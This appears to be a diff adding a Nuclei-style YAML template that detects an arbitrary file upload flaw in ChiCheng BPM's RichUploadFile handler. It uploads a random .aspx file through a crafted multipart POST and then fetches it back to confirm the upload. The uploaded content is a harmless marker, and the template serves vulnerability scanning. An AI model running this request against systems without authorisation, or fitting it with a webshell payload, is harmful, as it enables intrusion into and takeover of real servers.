@@ -1,0 +1,54 @@
+id: poc-yaml-ccbpm-richuploadfile-anyfile-upload
+
+info:
+  name: 驰骋BPM RichUploadFile 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in 驰骋BPM RichUploadFile component.
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "upload-test"
+    method: POST
+    path:
+      - /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="edit"; filename="{{t1}}.aspx"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".aspx"
+        condition: and
+      - type: status
+        status:
+          - 200
+
+  - id: "verify-upload"
+    method: GET
+    path:
+      - /DataUser/RichTextFile/Mazi/{{t1}}.aspx
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
